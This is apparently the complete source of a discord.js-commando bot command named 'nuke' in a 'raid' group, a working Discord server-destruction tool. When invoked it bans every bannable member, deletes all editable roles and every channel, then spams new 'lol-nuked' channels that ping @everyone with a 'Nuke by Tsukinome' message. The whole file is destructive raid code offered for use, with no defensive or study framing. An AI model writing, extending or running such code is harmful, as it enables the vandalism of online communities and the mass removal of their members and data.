const Commando = require("discord.js-commando");
const { Discord, Client } = require("discord.js");
const moment = require("moment");
const SpamRoles = require("./spamroles");

module.exports = class NukeCommand extends Commando.Command {
  constructor(client) {
    super(client, {
      name: "nuke",
      group: "raid",
      memberName: "nuke",
      description: "Nuke the server",
      guildOnly: true,
      argsType: "multiple",
      clientPermissions: ["MANAGE_ROLES"],
    });
  }

  async run(message, args) {
    //count

    let count = Math.round(args[0]);
    let countCategory = 40;

    //banall

    const { guild } = message;

    //Server Members Intent required under the Privileged Gateway Intents division
    await guild.members.fetch().then((members) => {
      members.forEach((m) => {
        if (m.bannable) {
          setTimeout(() => {
            m.ban({ reason: "LOL" });
          });
        }
      });
    });

    const time2 = moment().format("HH:mm:ss a");
    console.log(`${time2} | Command Ran: banall ✔️`);

    //delroles

    let roles = await message.guild.roles.cache.array();

    for (const role of roles) {
      if (role.name === "@everyone") continue;
      if (role.editable) {
        try {
          role
            .delete()
            .then((delRole) => console.log(`Deleted ${delRole.name}`));
        } catch (err) {
          console.warn(`Unable to delete ${role.name}`);
        }
      }
    }

    const time1 = moment().format("HH:mm:ss a");
    console.log(`${time1} | Command Ran: delroles ✔️`);

    //delchannels

    let channels = await message.guild.channels.cache.array();

    for (const channel of channels) {
      setTimeout(() => {
        channel.delete();
      }, 750);
    }

    const time8 = moment().format("HH:mm:ss a");
    console.log(`${time8} | Command Ran: delchannels ✔️`);

    //spamtextchannels

    let categoryId = "";
    message.guild.channels
      .create("| 💣 | SERVER NUKER", { type: "category" })
      .then((channel) => {
        channel.setPosition(0);
        categoryId = channel.id;
        channel.overwritePermissions([
          {
            id: message.guild.id,
            deny: ["SEND_MESSAGES"],
            allow: ["ADD_REACTIONS", "READ_MESSAGE_HISTORY", "VIEW_CHANNEL"],
          },
        ]);
      });

    for (let i = 1; i <= count; i++) {
      setTimeout(() => {
        message.guild.channels
          .create("lol-nuked", {
            type: "text",
            parent: categoryId,
            topic: "Epic nuker bot",
          })
          .then((channel) => {
            channel.send(
              `||@everyone||\nNuke by Tsukinome ! https://cdn.discordapp.com/attachments/1014289895889567774/1043593769221640222/bg_non_arreter-removebg-preview.png`
            );
          });
      }, 1000);
    }

    const time = moment().format("HH:mm:ss a");
    console.log(`${time} | Command Ran: spamtextchannel`);
  }
};
